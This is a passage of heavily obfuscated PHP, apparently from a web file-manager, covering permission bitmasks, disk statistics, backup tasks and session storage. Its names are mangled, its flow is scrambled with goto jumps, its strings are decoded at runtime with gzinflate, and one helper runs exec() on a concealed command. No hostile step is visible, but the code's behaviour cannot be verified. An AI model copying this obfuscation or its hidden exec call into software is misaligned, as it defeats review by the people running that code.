array($eµ‹§ùÇÃ[993], $d¿Ãéòõ›)); if ($aÕøšÆÈØ¹) { $FĞ‘õİ¡ßí[$eµ‹§ùÇÃ[29]] = array($eµ‹§ùÇÃ[7], $c‰îèÏ¹¾‘[$aÕøšÆÈØ¹]); } $B°İá¯‘µ = Model($eµ‹§ùÇÃ[1661])->where($FĞ‘õİ¡ßí)->count($EèÑ©‰’¾ö); goto b‘äõì¤Çî; C× ¥³ˆ·æ: $eµ‹§ùÇÃ =& $_SERVER[ä°„ä°º]; $c‰îèÏ¹¾‘ = array($eµ‹§ùÇÃ[107] => array($eµ‹§ùÇÃ[1688], $eµ‹§ùÇÃ[1689]), $eµ‹§ùÇÃ[430] => array($eµ‹§ùÇÃ[1690], $eµ‹§ùÇÃ[1691]), $eµ‹§ùÇÃ[1686] => array($eµ‹§ùÇÃ[1692], $eµ‹§ùÇÃ[1693], $eµ‹§ùÇÃ[1694]), $eµ‹§ùÇÃ[1687] => array($eµ‹§ùÇÃ[1695], $eµ‹§ùÇÃ[1696]), $eµ‹§ùÇÃ[1697] => array($eµ‹§ùÇÃ[1698], $eµ‹§ùÇÃ[1699], $eµ‹§ùÇÃ[1700])); $d¿Ãéòõ› = strtotime(date($eµ‹§ùÇÃ[1658])); goto F‘¦Ç·óêí; b‘äõì¤Çî: return (int) $B°İá¯‘µ; goto C‡‡‹£ÂÀ•; C‡‡‹£ÂÀ•: } private function optionServer() { goto a¬˜õÖîª; E¶ÛÜß«ßí: $D‹¡’çö¿ = $d†¼ÃĞè¸²[0]; $BÕ‘×ôÚŸ = $GLOBALS[$f¶Áéë”§§[6]][$f¶Áéë”§§[17]]; $e®ÀŞˆœ¿Ğ = $BÕ‘×ôÚŸ[$f¶Áéë”§§[954]]; goto Fš ¶‡ßê; e÷èµòãÎ: $dà®®åğ­â = array($f¶Áéë”§§[805] => $a‰»÷øºËç[$f¶Áéë”§§[393]]); $B‰†ñÅÜ„÷ = Model($f¶Áéë”§§[450])->where($dà®®åğ­â)->sum($f¶Áéë”§§[78]); $d†¼ÃĞè¸² = explode($f¶Áéë”§§[50], $_SERVER[$f¶Áéë”§§[142]]); goto E¶ÛÜß«ßí; a¬˜õÖîª: $f¶Áéë”§§ =& $_SERVER[ä°„ä°º]; $EÚ‰¼ç‘æ³ = $this->diskDriver(); $a‰»÷øºËç = KodIO::defaultDriver(); goto e÷èµòãÎ; FÊêëÇÁø¨: return array($f¶Áéë”§§[1703] => $EÚ‰¼ç‘æ³ ? $EÚ‰¼ç‘æ³[$f¶Áéë”§§[1704]] : 0, $f¶Áéë”§§[1705] => $EÚ‰¼ç‘æ³ ? $EÚ‰¼ç‘æ³[$f¶Áéë”§§[1706]] : 0, $f¶Áéë”§§[1707] => (int) $a‰»÷øºËç[$f¶Áéë”§§[1704]] * 1024 * 1024 * 1024, $f¶Áéë”§§[1708] => (int) $B‰†ñÅÜ„÷, $f¶Áéë”§§[1709] => ucfirst($D‹¡’çö¿), $f¶Áéë”§§[1710] => $f¶Áéë”§§[1711] . PHP_VERSION, $f¶Áéë”§§[1712] => phpBuild64() ? 64 : 32, $f¶Áéë”§§[741] => str_replace($f¶Áéë”§§[1713], $f¶Áéë”§§[970], $e®ÀŞˆœ¿Ğ), $f¶Áéë”§§[347] => ucfirst($cŠÛ½†–Öò), $f¶Áéë”§§[28] => $_SERVER[$f¶Áéë”§§[1714]]); goto dŠ‰†‚‡Ö‡; Fš ¶‡ßê: if ($e®ÀŞˆœ¿Ğ == $f¶Áéë”§§[778]) { $F©²‹•ëÇÊ = explode($f¶Áéë”§§[1188], $BÕ‘×ôÚŸ[$f¶Áéë”§§[953]]); $e®ÀŞˆœ¿Ğ = $F©²‹•ëÇÊ[0]; } if ($e®ÀŞˆœ¿Ğ == $f¶Áéë”§§[781] || $e®ÀŞˆœ¿Ğ == $f¶Áéë”§§[782]) { $a¹˜ïÖ™ã¹ = Model()->db()->query($f¶Áéë”§§[1701]); $E‹éªÇ¥ = $a¹˜ïÖ™ã¹[0] && isset($a¹˜ïÖ™ã¹[0][$f¶Áéë”§§[1453]]) ? $a¹˜ïÖ™ã¹[0][$f¶Áéë”§§[1453]] : 0; $e®ÀŞˆœ¿Ğ = $f¶Áéë”§§[1702] . ($E‹éªÇ¥ ? $f¶Áéë”§§[8] . $E‹éªÇ¥ : $f¶Áéë”§§[33]); } $cŠÛ½†–Öò = $GLOBALS[$f¶Áéë”§§[6]][$f¶Áéë”§§[347]][$f¶Áéë”§§[815]]; goto FÊêëÇÁø¨; dŠ‰†‚‡Ö‡: } private function diskDriver() { goto Eæ‚ÌŠ‘ê; E„À©ë…Ş¡: if ($D‡©¼ÜÆí) { $A­êÅô‰ = $DÄó‹‹èÚÂ[1717]; if (function_exists($DÄó‹‹èÚÂ[1718])) { exec($DÄó‹‹èÚÂ[1719], $côßÕìì­÷); $A­êÅô‰ = $côßÕìì­÷[1] . $DÄó‹‹èÚÂ[8]; } } if (!file_exists($A­êÅô‰)) { return; } $AÍÌÕ«ÍéÆ = @disk_total_space($A­êÅô‰); goto b®‘Õ­Å®; b®‘Õ­Å®: $AÎóÛô²Û = $AÍÌÕ«ÍéÆ - @disk_free_space($A­êÅô‰); return array($DÄó‹‹èÚÂ[1704] => $AÍÌÕ«ÍéÆ, $DÄó‹‹èÚÂ[1706] => $AÎóÛô²Û); goto eÄÊˆÎºë×; Eæ‚ÌŠ‘ê: $DÄó‹‹èÚÂ =& $_SERVER[ä°„ä°º]; $A­êÅô‰ = $DÄó‹‹èÚÂ[8]; $D‡©¼ÜÆí = $GLOBALS[$DÄó‹‹èÚÂ[6]][$DÄó‹‹èÚÂ[1715]] == $DÄó‹‹èÚÂ[1716]; goto E„À©ë…Ş¡; eÄÊˆÎºë×: } public function fileChart($FÃ‰¦´ğ« ) { goto d‰ò•; F²³ŸÍ‡á¯: $a¤”ç¿¸¸ï = $this->sourceSize(); $Fß øâµä = array($Fë±”Ì‰¯‚[478] => 0, $Fë±”Ì‰¯‚[404] => 1); $Cæâºæˆ«œ = Model($Fë±”Ì‰¯‚[813])->where($Fß øâµä)->sum($Fë±”Ì‰¯‚[78]); goto c ôÊÅàõ; d‰ò•: $Fë±”Ì‰¯‚ =& $_SERVER[ä°„ä°º]; if (isset($FÃ‰¦´ğ« [$Fë±”Ì‰¯‚[1551]])) { return Model($Fë±”Ì‰¯‚[813])->userFileTypeProfile($FÃ‰¦´ğ« [$Fë±”Ì‰¯‚[1551]]); } if (isset($FÃ‰¦´ğ« [$Fë±”Ì‰¯‚[1720]])) { return Model($Fë±”Ì‰¯‚[813])->groupFileTypeProfile($FÃ‰¦´ğ« [$Fë±”Ì‰¯‚[1720]]); } goto F²³ŸÍ‡á¯; c ôÊÅàõ: $Fß øâµä[$Fë±”Ì‰¯‚[404]] = 2; $e‹„åšÔ = Model($Fë±”Ì‰¯‚[813])->where($Fß øâµä)->sum($Fë±”Ì‰¯‚[78]); return array($Fë±”Ì‰¯‚[746] => $a¤”ç¿¸¸ï[$Fë±”Ì‰¯‚[78]], $Fë±”Ì‰¯‚[1651] => $a¤”ç¿¸¸ï[$Fë±”Ì‰¯‚[1651]], $Fë±”Ì‰¯‚[1652] => (int) $Cæâºæˆ«œ, $Fë±”Ì‰¯‚[1653] => (int) $e‹„åšÔ); goto eÜ³…Ö¤; eÜ³…Ö¤: } private function sourceSize() { $EÕ†Ù…¥§ª =& $_SERVER[ä°„ä°º]; $b‘†®ßŒ = Model($EÕ†Ù…¥§ª[813])->where(array($EÕ†Ù…¥§ª[403] => 0))->sum($EÕ†Ù…¥§ª[78]); $cëƒ·´Á÷ = Model($EÕ†Ù…¥§ª[450])->sum($EÕ†Ù…¥§ª[78]); if ($cëƒ·´Á÷ > $b‘†®ßŒ) { $cëƒ·´Á÷ = $b‘†®ßŒ; } return array($EÕ†Ù…¥§ª[78] => (int) $b‘†®ßŒ, $EÕ†Ù…¥§ª[1651] => (int) $cëƒ·´Á÷); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $DÛ’Á‡·ê =& $_SERVER[ä°„ä°º]; $D×®×‚ƒ³ = array(array($DÛ’Á‡·ê[413] => LNG($DÛ’Á‡·ê[1721]), $DÛ’Á‡·ê[1722] => $DÛ’Á‡·ê[1723], $DÛ’Á‡·ê[1724] => 1, $DÛ’Á‡·ê[1725] => 1, $DÛ’Á‡·ê[1726] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($DÛ’Á‡·ê[413] => LNG($DÛ’Á‡·ê[1727]), $DÛ’Á‡·ê[1722] => $DÛ’Á‡·ê[1728], $DÛ’Á‡·ê[1724] => 2, $DÛ’Á‡·ê[1725] => 1, $DÛ’Á‡·ê[1726] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($DÛ’Á‡·ê[413] => LNG($DÛ’Á‡·ê[1729]), $DÛ’Á‡·ê[1722] => $DÛ’Á‡·ê[1730], $DÛ’Á‡·ê[1724] => 3, $DÛ’Á‡·ê[1725] => 1, $DÛ’Á‡·ê[1726] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($DÛ’Á‡·ê[413] => LNG($DÛ’Á‡·ê[1731]), $DÛ’Á‡·ê[1722] => $DÛ’Á‡·ê[1732], $DÛ’Á‡·ê[1724] => 4, $DÛ’Á‡·ê[1725] => 1, $DÛ’Á‡·ê[1726] => self::AUTH_SHOW | self::AUTH_VIEW), array($DÛ’Á‡·ê[413] => LNG($DÛ’Á‡·ê[1733]), $DÛ’Á‡·ê[1722] => $DÛ’Á‡·ê[1734], $DÛ’Á‡·ê[1724] => 5, $DÛ’Á‡·ê[1725] => 1, $DÛ’Á‡·ê[1726] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($DÛ’Á‡·ê[413] => LNG($DÛ’Á‡·ê[1735]), $DÛ’Á‡·ê[1722] => $DÛ’Á‡·ê[1736], $DÛ’Á‡·ê[1724] => 6, $DÛ’Á‡·ê[1725] => 1, $DÛ’Á‡·ê[1726] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($DÛ’Á‡·ê[413] => LNG($DÛ’Á‡·ê[1737]), $DÛ’Á‡·ê[1722] => $DÛ’Á‡·ê[1738], $DÛ’Á‡·ê[1724] => 7, $DÛ’Á‡·ê[1725] => 1, $DÛ’Á‡·ê[1726] => 0)); return $D×®×‚ƒ³; } public static function authCheck($A½ÆÊ¯ç¿’, $b›·ßõçİš) { $A½ÆÊ¯ç¿’ = intval($A½ÆÊ¯ç¿’); if ($GLOBALS[$_SERVER[ä°„ä°º][485]]) { return !0; } if ($A½ÆÊ¯ç¿’ <= 0) { return !1; } if (($A½ÆÊ¯ç¿’ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($A½ÆÊ¯ç¿’ & $b›·ßõçİš); } public static function authCheckShow($B”ËÍ°¥’) { return self::authCheck($B”ËÍ°¥’, self::AUTH_SHOW); } public static function authCheckView($eåï²Ã‘¼±) { return self::authCheck($eåï²Ã‘¼±, self::AUTH_VIEW); } public static function authCheckDownload($A‘à²ÚñÒ) { return self::authCheck($A‘à²ÚñÒ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($cšµòïËŞ‚) { return self::authCheck($cšµòïËŞ‚, self::AUTH_UPLOAD); } public static function authCheckEdit($e’¢Ğ¡ «œ) { return self::authCheck($e’¢Ğ¡ «œ, self::AUTH_EDIT); } public static function authCheckRemove($D©Âñ´ŠÌ÷) { return self::authCheck($D©Âñ´ŠÌ÷, self::AUTH_REMOVE); } public static function authCheckShare($eàí§¥Ÿ–Ú) { return self::authCheck($eàí§¥Ÿ–Ú, self::AUTH_SHARE); } public static function authCheckComment($FŸòçÖ¤„º) { return self::authCheck($FŸòçÖ¤„º, self::AUTH_COMMENT); } public static function authCheckEvent($a¢“ÓÀÒ¡ë) { return self::authCheck($a¢“ÓÀÒ¡ë, self::AUTH_EVENT); } public static function authCheckRoot($D¥©Ò²¹¬) { return self::authCheck($D¥©Ò²¹¬, self::AUTH_ROOT); } public static function authCheckAction($dÑøÜ…À’æ, $B¸Š®çß•) { goto cÁí«ãÑ»Õ; cÁí«ãÑ»Õ: $E¡À¼ÃÙÙË =& $_SERVER[ä°„ä°º]; $FĞ©»Ö´Ë = array($E¡À¼ÃÙÙË[1739] => self::AUTH_VIEW, $E¡À¼ÃÙÙË[1115] => self::AUTH_DOWNLOAD, $E¡À¼ÃÙÙË[107] => self::AUTH_UPLOAD, $E¡À¼ÃÙÙË[1687] => self::AUTH_EDIT, $E¡À¼ÃÙÙË[1686] => self::AUTH_REMOVE, $E¡À¼ÃÙÙË[1697] => self::AUTH_SHARE, $E¡À¼ÃÙÙË[352] => self::AUTH_COMMENT, $E¡À¼ÃÙÙË[1539] => self::AUTH_EVENT, $E¡À¼ÃÙÙË[1740] => self::AUTH_ROOT); if (!isset($FĞ©»Ö´Ë[$B¸Š®çß•])) { return; } goto e¹ğØ›‰¶“; d©¢„¨ÍÑ†: if (($dÑøÜ…À’æ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($dÑøÜ…À’æ & $DÈ¹Õ–íª²); goto a–¿Ó•å†à; e¹ğØ›‰¶“: $DÈ¹Õ–íª² = $FĞ©»Ö´Ë[$B¸Š®çß•]; $dÑøÜ…À’æ = intval($dÑøÜ…À’æ); if ($dÑøÜ…À’æ <= 0) { return !1; } goto d©¢„¨ÍÑ†; a–¿Ó•å†à: } public static function authDisable($E±Ò¬÷¼•, $DÄ¶ŠìôÓ¼) { if (intval($E±Ò¬÷¼•) <= 0) { return 0; } return intval($E±Ò¬÷¼•) & ~$DÄ¶ŠìôÓ¼; } public $optionType = "\x53\171\163\164\x65\155\x2e\x73\x6f\x75\162\x63\145\101\165\x74\150\x4c\x69\163\x74"; public $field = array("\156\141\155\145", "\x61\x75\x74\150", "\x6c\x61\x62\145\x6c", "\144\x69\163\160\x6c\141\171", "\x73\x79\x73\164\145\x6d", "\x73\x6f\162\x74"); public function initData() { $CƒÊ—³æÃÜ = $this->authDefault(); foreach ($CƒÊ—³æÃÜ as $d°›¿Ñ·î†) { $this->add($d°›¿Ñ·î†); } } public function findAuth($FŒÌ¸©´Ìï, $A§½Ñ½Ñ†ë) { $F£‹¥òÇºØ =& $_SERVER[ä°„ä°º]; $C™‡÷¡ŠŒï = parent::listData(); foreach ($C™‡÷¡ŠŒï as $c²ÛÖÍ­Ÿ®) { $A‹¤š«ÆÑ¤ = intval($c²ÛÖÍ­Ÿ®[$F£‹¥òÇºØ[406]]); if ($A‹¤š«ÆÑ¤ <= 0 || $c²ÛÖÍ­Ÿ®[$F£‹¥òÇºØ[1741]] == 0) { continue; } if (($A‹¤š«ÆÑ¤ & $FŒÌ¸©´Ìï) != $FŒÌ¸©´Ìï) { continue; } if (($A‹¤š«ÆÑ¤ & $A§½Ñ½Ñ†ë) != 0) { continue; } return $c²ÛÖÍ­Ÿ®[$F£‹¥òÇºØ[393]]; } return !1; } public function findAuthReadOnly() { $CçÁ»ÆŠê = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $FÒ…ËÁÙœ² = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($CçÁ»ÆŠê, $FÒ…ËÁÙœ²); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($C‚ªÒ‚Ï—ø = false, $FŸ—•„ŠÍá = "\x73\x6f\162\164", $CïÏ´Åíë« = false) { return parent::listData($C‚ªÒ‚Ï—ø, $FŸ—•„ŠÍá, $CïÏ´Åíë«); } public function update($B‹„•óèÍ, $FÜ¸ÜÇˆ) { $DÙÌ§ğš±¡ =& $_SERVER[ä°„ä°º]; $bÃÔÊ×¬„ = parent::listData($B‹„•óèÍ); $FŠŸˆÀï‰Ñ = $this->findByName($FÜ¸ÜÇˆ[$DÙÌ§ğš±¡[28]]); if (!$bÃÔÊ×¬„ || $FŠŸˆÀï‰Ñ && $FŠŸˆÀï‰Ñ[$DÙÌ§ğš±¡[393]] != $bÃÔÊ×¬„[$DÙÌ§ğš±¡[393]]) { return !1; } $this->filterAuth($FÜ¸ÜÇˆ[$DÙÌ§ğš±¡[406]]); return parent::update($B‹„•óèÍ, $FÜ¸ÜÇˆ); } public function remove($DÅ¹ªôõÀÈ) { $fÅáµ›¡µÕ = parent::listData($DÅ¹ªôõÀÈ); if (!$fÅáµ›¡µÕ || $fÅáµ›¡µÕ[$_SERVER[ä°„ä°º][1192]]) { return !1; } return parent::remove($DÅ¹ªôõÀÈ); } public function add($c¢¢Ş Ä„ç = array()) { goto DŸå•Â­“; BÏ»¸¢ñÈ°: return parent::insert($c¢¢Ş Ä„ç); goto cñ‰ç»ĞµÅ; AŒº•ùª°×: $c¢¢Ş Ä„ç = array_merge($a‘ÜÔÊŠñ, $c¢¢Ş Ä„ç); $c¢¢Ş Ä„ç[$CÀê´°¸Ú[1743]] = $this->getSort(); $this->filterAuth($c¢¢Ş Ä„ç[$CÀê´°¸Ú[406]]); goto BÏ»¸¢ñÈ°; DŸå•Â­“: $CÀê´°¸Ú =& $_SERVER[ä°„ä°º]; if ($this->findByName($c¢¢Ş Ä„ç[$CÀê´°¸Ú[28]])) { return !1; } $a‘ÜÔÊŠñ = array($CÀê´°¸Ú[28] => $CÀê´°¸Ú[33], $CÀê´°¸Ú[406] => 1, $CÀê´°¸Ú[1742] => $CÀê´°¸Ú[1730], $CÀê´°¸Ú[1741] => 1, $CÀê´°¸Ú[1192] => 0, $CÀê´°¸Ú[1743] => 0); goto AŒº•ùª°×; cñ‰ç»ĞµÅ: } private function getSort() { $b©ëœŒêÑ¿ =& $_SERVER[ä°„ä°º]; $A®ã³ÅŒ³¯ = parent::listData(); $A›ÈãÆ¾  = array_to_keyvalue($A®ã³ÅŒ³¯, $b©ëœŒêÑ¿[33], $b©ëœŒêÑ¿[1743]); return empty($A›ÈãÆ¾ ) ? 0 : max($A›ÈãÆ¾ ) + 1; } private function filterAuth(&$fÅ—ğãÌçÎ) { goto DŒğƒÇ×­; e½Õ˜¬Ç½: foreach ($b¡©õïÂïÖ as $DáØ×Š•˜ø) { if (isset($CõˆÛá§±ğ[$DáØ×Š•˜ø])) { $b¡©õïÂïÖ = array_merge($b¡©õïÂïÖ, $CõˆÛá§±ğ[$DáØ×Š•˜ø]); } } $b¡©õïÂïÖ[] = self::AUTH_SHOW; $fÅ—ğãÌçÎ = array_sum(array_unique($b¡©õïÂïÖ)); goto fªåŸŞƒÅ; fŠ‚Ê¶è³©: foreach ($bÀØ™¨‰‰Š as $DáØ×Š•˜ø) { if ($fÅ—ğãÌçÎ & $DáØ×Š•˜ø) { $b¡©õïÂïÖ[] = $DáØ×Š•˜ø; } } if (in_array(self::AUTH_ROOT, $b¡©õïÂïÖ)) { $fÅ—ğãÌçÎ = array_sum($bÀØ™¨‰‰Š); return; } $CõˆÛá§±ğ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto e½Õ˜¬Ç½; DŒğƒÇ×­: if (!$fÅ—ğãÌçÎ) { return; } $bÀØ™¨‰‰Š = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $b¡©õïÂïÖ = array(); goto fŠ‚Ê¶è³©; fªåŸŞƒÅ: } public function sort($EÀİ÷®âÇ, $dˆÌí²¹„) { return parent::update($EÀİ÷®âÇ, $dˆÌí²¹„); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\56\142\141\143\153\165\x70\114\x69\x73\x74"; public $field = array("\x69\x6f", "\x6e\141\x6d\x65", "\163\164\x61\x74\x75\163", "\x63\157\x6e\164\145\156\x74", "\155\x61\156\165\x61\154", "\162\x65\x73\165\154\164", "\164\x69\155\x65\x46\x72\157\x6d", "\164\x69\155\x65\124\157"); public function config() { goto f‹¿Ã£“¹ã; c“¬ôŸ»ÒÏ: $FĞÊ×ŞÉ¬² = is_array($FĞÊ×ŞÉ¬²) ? $FĞÊ×ŞÉ¬² : array(); if (!isset($FĞÊ×ŞÉ¬²[$aÕîŠâ”[738]])) { $FĞÊ×ŞÉ¬²[$aÕîŠâ”[738]] = $aÕîŠâ”[87]; } unset($FĞÊ×ŞÉ¬²[$aÕîŠâ”[1521]]); goto cô­Û©®ğ¦; fœÓ³„ƒÁ–: $BÁ¬êÎ˜¬‰ = Model($aÕîŠâ”[1746])->findByKey($aÕîŠâ”[1539], $d¡ĞŒÌ¡Ô); if (!$BÁ¬êÎ˜¬‰) { $BÁ¬êÎ˜¬‰ = array(); } if (isset($BÁ¬êÎ˜¬‰[$aÕîŠâ”[197]])) { $BÁ¬êÎ˜¬‰[$aÕîŠâ”[197]] = json_decode($BÁ¬êÎ˜¬‰[$aÕîŠâ”[197]], !0); } goto e¶¤ø¯†õ‡; cô­Û©®ğ¦: Action($aÕîŠâ”[1744])->taskInit(); Model($aÕîŠâ”[1520])->cacheClear(); $d¡ĞŒÌ¡Ô = $aÕîŠâ”[1745]; goto fœÓ³„ƒÁ–; e¶¤ø¯†õ‡: if (isset($FĞÊ×ŞÉ¬²[$aÕîŠâ”[197]])) { $BÁ¬êÎ˜¬‰[$aÕîŠâ”[197]][$aÕîŠâ”[1524]] = $FĞÊ×ŞÉ¬²[$aÕîŠâ”[197]]; unset($FĞÊ×ŞÉ¬²[$aÕîŠâ”[197]]); } return array_merge($BÁ¬êÎ˜¬‰, $FĞÊ×ŞÉ¬²); goto F¶ì¡Ê‚¾å; f‹¿Ã£“¹ã: $aÕîŠâ” =& $_SERVER[ä°„ä°º]; $FĞÊ×ŞÉ¬² = Model($aÕîŠâ”[753])->get($aÕîŠâ”[765]); $FĞÊ×ŞÉ¬² = json_decode($FĞÊ×ŞÉ¬², !0); goto c“¬ôŸ»ÒÏ; F¶ì¡Ê‚¾å: } public function listData($E›®óğÔİ“ = false, $e¤†Ò©¾Æ = "\x6d\157\144\151\x66\171\124\151\155\145", $aã“¼„¼Œç = false) { return parent::listData($E›®óğÔİ“, $e¤†Ò©¾Æ, !0); } public function lastItem() { $c½íĞ‹åÎØ = $this->listData(); return !empty($c½íĞ‹åÎØ[0]) ? $c½íĞ‹åÎØ[0] : null; } public function kill($A…¥ïÜË¹â) { goto dŞŠ°Ç¼Ä; dŞŠ°Ç¼Ä: $dË‡Æ±ØïĞ =& $_SERVER[ä°„ä°º]; $DØ¶Õšª…Õ = $this->listData($A…¥ïÜË¹â); if (!$DØ¶Õšª…Õ || empty($DØ¶Õšª…Õ[$dË‡Æ±ØïĞ[28]])) { return !0; } goto BéôÅ­–²Ò; a²Œ„×·˜: return $this->remove($A…¥ïÜË¹â); goto c¯©æ½Š‰é; BéôÅ­–²Ò: Task::kill($dË‡Æ±ØïĞ[764]); Task::kill($dË‡Æ±ØïĞ[787]); Task::kill($dË‡Æ±ØïĞ[797]); goto f±…ªŒˆÀ¬; f±…ªŒˆÀ¬: $f¸¿”ğİôì = $DØ¶Õšª…Õ[$dË‡Æ±ØïĞ[28]]; $BÎ¨ˆš‡Ó¥ = TEMP_FILES . $dË‡Æ±ØïĞ[761] . $f¸¿”ğİôì . $dË‡Æ±ØïĞ[8]; IO::remove($BÎ¨ˆš‡Ó¥, !1); goto a²Œ„×·˜; c¯©æ½Š‰é: } public function remove($aøŸ¤Ÿ‰Àà) { $BêÅ†Î¤ö = $this->listData($aøŸ¤Ÿ‰Àà); if (!$BêÅ†Î¤ö) { return !0; } return $this->backupRemove($BêÅ†Î¤ö); } private function backupRemove($b˜ñ£Î’ò) { parent::remove($b˜ñ£Î’ò[$_SERVER[ä°„ä°º][393]]); $Aù¨¯ïÒ¨ñ = $this->backupPath($b˜ñ£Î’ò); IO::remove($Aù¨¯ïÒ¨ñ, !1); return !0; } private function backupPath($b›İ“¨ñÎ) { $FŠ„°ÉÃ‡¬ =& $_SERVER[ä°„ä°º]; $Cò¬ÌÅ¬à = $b›İ“¨ñÎ[$FŠ„°ÉÃ‡¬[28]]; $e†™›§¤±Ò = Model($FŠ„°ÉÃ‡¬[753])->get($FŠ„°ÉÃ‡¬[754]); $F†ØÏáùùª = substr(md5($FŠ„°ÉÃ‡¬[755] . $e†™›§¤±Ò . $Cò¬ÌÅ¬à), 0, 8); return "\173\x69\x6f\x3a{$b›İ“¨ñÎ[$FŠ„°ÉÃ‡¬[735]]}\x7d\57\144\141\x74\x61\142\x61\x73\145\x2f\142\x61\x63\x6b\165\x70\57" . $Cò¬ÌÅ¬à . $FŠ„°ÉÃ‡¬[71] . $F†ØÏáùùª; } public function start() { goto F¡°ÃŒ†™’; bùÖ¯¢áº: if (!$c±³ïñîÃ” || $c±³ïñîÃ”[$f…î¥è©§Û[1521]] != $f…î¥è©§Û[87]) { return !1; } $EÓ˜ñÉ¬ğ = $this->process(); foreach ($EÓ˜ñÉ¬ğ as $d¢°‰îå) { if ($d¢°‰îå) { return Task::restart($d¢°‰îå[$f…î¥è©§Û[393]]); } } goto F·Ä’ŞÌî; F·Ä’ŞÌî: $d• ¯í˜«ò = new Backup(); $aÛö«ÚÚİ· = $d• ¯í˜«ò->db(); if ($aÛö«ÚÚİ·) { $aÛö«ÚÚİ· = $d• ¯í˜«ò->dbFile(); if ($aÛö«ÚÚİ· && $c±³ïñîÃ”[$f…î¥è©§Û[738]] == $f…î¥è©§Û[191]) { $aÛö«ÚÚİ· = $d• ¯í˜«ò->file(); } } goto E”„ÕÕÜí; F¡°ÃŒ†™’: $f…î¥è©§Û =& $_SERVER[ä°„ä°º]; if ($GLOBALS[$f…î¥è©§Û[6]][$f…î¥è©§Û[88]][$f…î¥è©§Û[1747]] != $f…î¥è©§Û[87]) { return !0; } $c±³ïñîÃ” = $this->config(); goto bùÖ¯¢áº; E”„ÕÕÜí: Backup::set(array($f…î¥è©§Û[733] => 1, $f…î¥è©§Û[476] => time())); return !0; goto fë—¾¼Å·“; fë—¾¼Å·“: } public function process() { $aå‰Û®­ËŞ =& $_SERVER[ä°„ä°º]; return array($aå‰Û®­ËŞ[741] => Task::get($aå‰Û®­ËŞ[764]), $aå‰Û®­ËŞ[745] => Task::get($aå‰Û®­ËŞ[787]), $aå‰Û®­ËŞ[193] => Task::get($aå‰Û®­ËŞ[797])); } public function restore() { $Bà¶Ìì˜ =& $_SERVER[ä°„ä°º]; ActionCall($Bà¶Ìì˜[1039], !0, 1); ActionCall($Bà¶Ìì˜[1039], !0, 0); } } goto B“ ¨½ç¿; eÑÎôö®˜: $cÆó×•Œğ = $_SERVER[ä°„ä°º][587]; $_SERVER[ÖÙ“üÓ½‰] = explode($_SERVER[ä°„ä°º][588], gzinflate(substr($_SERVER[ä°„ä°º][589], 10, -8))); $dÂÂáÜñÀ = $_SERVER[ä°„ä°º][590]; goto cÖšŒ£ˆŒ‡; b–„Úƒ¿’: class SessionModel extends ModelBase { protected $tableName = "\163\171\163\164\145\155\x5f\163\145\x73\x73\x69\157\156"; public function get($aãô® ¯†Õ) { $d°¢Ô–«°‡ =& $_SERVER[ä°„ä°º]; $bÙ•ƒ¦ÜÃ = $this->where(array($d°¢Ô–«°‡[1844] => $aãô® ¯†Õ))->find(); if (!is_array($bÙ•ƒ¦ÜÃ)) { return !1; } return $bÙ•ƒ¦ÜÃ[$d°¢Ô–«°‡[738]]; } public function set($Aİ¥£ÊÄé‡, $aŠÌàÁğíÁ, $e‘ã³ÍÎøÏ = 3600) { $BŞìƒÁ‹ =& $_SERVER[ä°„ä°º]; $BÙîÑñø² = array($BŞìƒÁ‹[1844] => $Aİ¥£ÊÄé‡, $BŞìƒÁ‹[1753] => $aŠÌàÁğíÁ, $BŞìƒÁ‹[1845] => $e‘ã³ÍÎøÏ + time()); if (Session::get($BŞìƒÁ‹[1846])) { $BÙîÑñø²[$BŞìƒÁ‹[1551]] = Session::get($BŞìƒÁ‹[1846]); } else { $BÙîÑñø²[$BŞìƒÁ‹[1551]] = 0; } if ($this->get($Aİ¥£ÊÄé‡)) { return $this->where(array($BŞìƒÁ‹[1844] => $Aİ¥£ÊÄé‡))->save($BÙîÑñø²); } else { return $this->add($BÙîÑñø², array(), !0); } } public function remove($Cğ¸½ªØ´) { return $this->where(array($_SERVER[ä°„ä°º][1844] => $Cğ¸½ªØ´))->delete(); } 